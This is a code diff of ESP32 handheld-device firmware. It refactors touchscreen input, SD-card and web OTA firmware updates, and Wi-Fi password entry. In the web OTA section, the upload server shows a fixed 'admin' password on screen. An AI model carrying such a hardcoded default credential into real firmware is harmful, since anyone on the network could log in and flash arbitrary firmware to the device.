       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3589,10 +4378,8 @@ void performSDUpdate() {
 
   bool proceed = true;
   while (proceed) {
-    if (ts.touched()) {
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+    int x, y;
+    if (readTouchXY(x, y)) {
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3603,16 +4390,28 @@ void performSDUpdate() {
     tft.setTextColor(TFT_WHITE, TFT_BLACK);
     tft.setCursor(10, 30 + yshift);
     tft.println("Initializing SD...");
-    if (!SD.begin(SD_CS_PIN)) {
-      tft.setTextColor(TFT_RED, TFT_BLACK);
+
+    bool ok = false;
+    #ifdef SD_CS
+    ok = SD.begin(SD_CS);
+    #endif
+    #ifdef SD_CS_PIN
+    if (!ok) {
+      #ifdef CC1101_CS
+      if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
+      #else
+      ok = SD.begin(SD_CS_PIN);
+      #endif
+    }
+    #endif
+    if (!ok) {
+      tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 40 + yshift);
       tft.println("X SD init failed!");
       tft.setCursor(10, 50 + yshift);
       tft.println("Touch to retry or Back");
-      waitForTouch();
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+      int x, y;
+      waitForTouchXY(x, y);
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3629,15 +4428,13 @@ void performSDUpdate() {
     tft.println("SD card OK");
 
     if (!SD.exists(FIRMWARE_FILE)) {
-      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 30 + yshift);
       tft.println("X Firmware not found!");
       tft.setCursor(10, 40 + yshift);
       tft.println("Touch to retry or Back");
-      waitForTouch();
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+      int x, y;
+      waitForTouchXY(x, y);
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3652,15 +4449,13 @@ void performSDUpdate() {
 
     File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
     if (!firmwareFile) {
-      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 30 + yshift);
       tft.println("X File open failed!");
       tft.setCursor(10, 40 + yshift);
       tft.println("Touch to retry or Back");
-      waitForTouch();
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+      int x, y;
+      waitForTouchXY(x, y);
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3678,15 +4473,13 @@ void performSDUpdate() {
     tft.setCursor(10, 50 + yshift);
     tft.printf("Size: %u bytes\n", fileSize);
     if (!Update.begin(fileSize)) {
-      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 30 + yshift);
       tft.println("X Update init failed!");
       tft.setCursor(10, 40 + yshift);
       tft.println("Touch to retry or Back");
-      waitForTouch();
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+      int x, y;
+      waitForTouchXY(x, y);
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3704,15 +4497,13 @@ void performSDUpdate() {
     tft.println("Updating...");
     size_t written = Update.writeStream(firmwareFile);
     if (written != fileSize) {
-      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 30 + yshift);
       tft.println("X Update failed!");
       tft.setCursor(10, 40 + yshift);
       tft.println("Touch to retry or Back");
-      waitForTouch();
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+      int x, y;
+      waitForTouchXY(x, y);
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3735,15 +4526,13 @@ void performSDUpdate() {
       delay(2000);
       ESP.restart();
     } else {
-      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 30 + yshift);
       tft.println("X Finalize failed!");
       tft.setCursor(10, 40 + yshift);
       tft.println("Touch to retry or Back");
-      waitForTouch();
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+      int x, y;
+      waitForTouchXY(x, y);
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         drawMenu();
         return;
@@ -3758,8 +4547,6 @@ void performSDUpdate() {
     proceed = false;
   }
 }
-
-
 
 bool selectWiFiNetwork() {
   uiDrawn = false;
@@ -3783,12 +4570,10 @@ bool selectWiFiNetwork() {
     tft.setCursor(10, 60);
     tft.println("Touch to retry");
     drawTabBar("Rescan", false, "", true, "", true);
-    while (!ts.touched()) {
+    int x, y;
+    while (!readTouchXY(x, y)) {
       delay(10);
     }
-    TS_Point p = ts.getPoint();
-    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
     delay(200);
     if (x >= TAB_LEFT_X && x < TAB_LEFT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT) {
       return selectWiFiNetwork();
@@ -3810,12 +4595,10 @@ bool selectWiFiNetwork() {
   bool selected = false;
   while (!selected) {
     drawNetworkList(startIndex, numNetworks, networks, selectedIndex);
-    while (!ts.touched()) {
+    int x, y;
+    while (!readTouchXY(x, y)) {
       delay(10);
     }
-    TS_Point p = ts.getPoint();
-    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
     delay(200);
 
     int y_pos = NETWORK_Y_START;
@@ -3858,7 +4641,7 @@ bool selectWiFiNetwork() {
       startIndex += NETWORKS_PER_PAGE;
       selectedIndex = -1;
     }
-    if (x >= 0 && x < 30 && y >= 10 && y < 30) { // Back
+    if (x >= 0 && x < 30 && y >= 10 && y < 30) {
       wifiPassword[0] = '\0';
       return false;
     }
@@ -3913,7 +4696,6 @@ void drawNetworkList(int startIndex, int numNetworks, NetworkInfo* networks, int
   bool nextDisabled = (startIndex + NETWORKS_PER_PAGE) >= numNetworks;
   drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);
 
-
 }
 
 void drawInputField() {
@@ -3933,8 +4715,6 @@ void drawKeyboard() {
 
   tft.setTextColor(TFT_WHITE, TFT_BLACK);
   tft.setTextSize(1);
-  //tft.setCursor(1, 10);
-  //tft.printf("Enter Password for %s", selectedSSID);
 
   tft.fillRect(0, 37, 240, 20, TFT_BLACK);
   tft.setTextColor(TFT_WHITE, TFT_BLACK);
@@ -3960,7 +4740,7 @@ void drawKeyboard() {
     yOffset += KEY_HEIGHT + KEY_SPACING;
   }
 
-  int buttonY = 160; // Original y=150 + 10
+  int buttonY = 160;
   tft.setTextColor(ORANGE);
   tft.setTextSize(1);
   tft.setTextDatum(MC_DATUM);
@@ -4004,71 +4784,37 @@ void updateInputField() {
 
 bool enterWiFiPassword() {
   wifiPassword[0] = '\0';
-  drawKeyboard();
 
-  bool done = false;
-  while (!done) {
-    while (!ts.touched()) {
-      delay(10);
-    }
-    TS_Point p = ts.getPoint();
-    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
-    delay(200);
+  OnScreenKeyboardConfig cfg;
+  cfg.titleLine1      = "[!] Enter the Wi-Fi password for the";
+  cfg.titleLine2      = "selected network.";
+  cfg.rows            = keyboardLayout;
+  cfg.rowCount        = 4;
+  cfg.maxLen          = PASSWORD_MAX_LENGTH;
+  cfg.shuffleNames    = nullptr;
+  cfg.shuffleCount    = 0;
+  cfg.buttonsY        = 195;
+  cfg.backLabel       = "Back";
+  cfg.middleLabel     = "Del";
+  cfg.okLabel         = "OK";
+  cfg.enableShuffle   = false;
+  cfg.requireNonEmpty = true;
+  cfg.emptyErrorMsg   = "Password cannot be empty!";
 
-    int yOffset = KEYBOARD_Y_OFFSET_START;
-    for (int row = 0; row < 4; row++) {
-      int xOffset = 10;
-      for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
-        if (x >= xOffset && x < xOffset + KEY_WIDTH && y >= yOffset && y < yOffset + KEY_HEIGHT) {
-          char c = keyboardLayout[row][col];
-          tft.fillRect(xOffset, yOffset, KEY_WIDTH, KEY_HEIGHT, ORANGE);
-          tft.setTextColor(TFT_WHITE);
-          tft.setTextSize(1);
-          tft.setCursor(xOffset + 5, yOffset + 4);
-          tft.print(c);
-          delay(100);
-          tft.fillRect(xOffset, yOffset, KEY_WIDTH, KEY_HEIGHT, TFT_DARKGREY);
-          tft.setTextColor(TFT_WHITE);
-          tft.setCursor(xOffset + 5, yOffset + 4);
-          tft.print(c);
-          if (c == '<') {
-            if (strlen(wifiPassword) > 0) {
-              wifiPassword[strlen(wifiPassword) - 1] = '\0';
-            }
-          } else if (c == '-') {
-            wifiPassword[0] = '\0';
-          } else if (c != ' ') {
-            if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
-              size_t len = strlen(wifiPassword);
-              wifiPassword[len] = c;
-              wifiPassword[len + 1] = '\0';
-            }
-          }
-          updateInputField();
-        }
-        xOffset += KEY_WIDTH + KEY_SPACING;
-      }
-      yOffset += KEY_HEIGHT + KEY_SPACING;
-    }
+  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");
 
-    // Check control buttons
-    if (x >= 5 && x < 75 && y >= 160 && y < 185) { // Back
-      wifiPassword[0] = '\0';
-      return false;
-    }
-    if (x >= 85 && x < 155 && y >= 160 && y < 185) { // Del
-      if (strlen(wifiPassword) > 0) {
-        wifiPassword[strlen(wifiPassword) - 1] = '\0';
-      }
-      updateInputField();
-    }
-    if (x >= 165 && x < 235 && y >= 160 && y < 185) { // OK
-      if (strlen(wifiPassword) > 0) {
-        done = true;
-      } 
-    }
+  if (!r.accepted) {
+
+    wifiPassword[0] = '\0';
+    return false;
   }
+
+  size_t n = min((size_t)PASSWORD_MAX_LENGTH, (size_t)r.text.length());
+  for (size_t i = 0; i < n; ++i) {
+    wifiPassword[i] = r.text[i];
+  }
+  wifiPassword[n] = '\0';
+
   return true;
 }
 
@@ -4102,10 +4848,8 @@ void performWebOTAUpdate() {
   WiFi.begin(selectedSSID, wifiPassword);
   int attempts = 0;
   while (WiFi.status() != WL_CONNECTED && attempts < 20) {
-    if (ts.touched()) {
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+    int x, y;
+    if (readTouchXY(x, y)) {
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         WiFi.disconnect();
         drawMenu();
@@ -4117,15 +4861,13 @@ void performWebOTAUpdate() {
     attempts++;
   }
   if (WiFi.status() != WL_CONNECTED) {
-    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setTextColor(UI_WARN, TFT_BLACK);
     tft.setCursor(10, 40 + yshift);
     tft.println("X Wi-Fi failed!");
     tft.setCursor(10, 50 + yshift);
     tft.println("Touch to retry or Back");
-    waitForTouch();
-    TS_Point p = ts.getPoint();
-    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+    int x, y;
+    waitForTouchXY(x, y);
     if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
       WiFi.disconnect();
       drawMenu();
@@ -4149,15 +4891,13 @@ void performWebOTAUpdate() {
   tft.println("Pass: admin");
 
   if (!MDNS.begin(host)) {
-    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setTextColor(UI_WARN, TFT_BLACK);
     tft.setCursor(10, 40 + yshift);
     tft.println("X mDNS failed!");
     tft.setCursor(10, 50 + yshift);
     tft.println("Touch to retry or Back");
-    waitForTouch();
-    TS_Point p = ts.getPoint();
-    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+    int x, y;
+    waitForTouchXY(x, y);
     if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
       WiFi.disconnect();
       drawMenu();
@@ -4201,16 +4941,14 @@ void performWebOTAUpdate() {
     } else {
       tft.fillRect(0, 37, 240, 320, TFT_BLACK);
       tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_RED, TFT_BLACK);
+      tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.println("X Update Failed!");
       tft.setTextColor(TFT_WHITE, TFT_BLACK);
       tft.setCursor(10, 20 + yshift);
       tft.println("Touch to retry or Back");
       drawTabBar("", false, "", false, "Back", false);
-      waitForTouch();
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
+      int x, y;
+      waitForTouchXY(x, y);
       if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         server.close();
         WiFi.disconnect();
@@ -4257,11 +4995,9 @@ void performWebOTAUpdate() {
 
   while (true) {
     server.handleClient();
-    if (ts.touched() && !inUpdate) {
-      TS_Point p = ts.getPoint();
-      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
-      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
+    if (!inUpdate) {
+      int x, y;
+      if (readTouchXY(x, y) && checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
         server.close();
         WiFi.disconnect();
         drawMenu();
@@ -4273,12 +5009,10 @@ void performWebOTAUpdate() {
   }
 }
 
-
 void updateSetup() {
-  
+
   tft.fillScreen(TFT_BLACK);
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
-  //tft.fillRect(0, 37, 240, 320, TFT_BLACK);
 
   tft.setTextColor(TFT_WHITE, TFT_BLACK);
   tft.setTextSize(0);
@@ -4288,7 +5022,7 @@ void updateSetup() {
   uiDrawn = false;
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
   runUI();
 
   drawMenu();
@@ -4296,17 +5030,19 @@ void updateSetup() {
 
 void updateLoop() {
 
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
   updateStatusBar();
   runUI();
+  if (feature_exit_requested) return;
 
-  if (ts.touched()) {
-    TS_Point p = ts.getPoint();
-
-    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
-    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
-
+  int x, y;
+  if (readTouchXY(x, y)) {
     if (x > BUTTON1_X && x < BUTTON1_X + BUTTON_WIDTH && y > BUTTON1_Y && y < BUTTON1_Y + BUTTON_HEIGHT) {
       performSDUpdate();
     }
@@ -4314,6 +5050,6 @@ void updateLoop() {
       performWebOTAUpdate();
     }
     delay(200);
-    }
-  }   
+  }
+}
 }
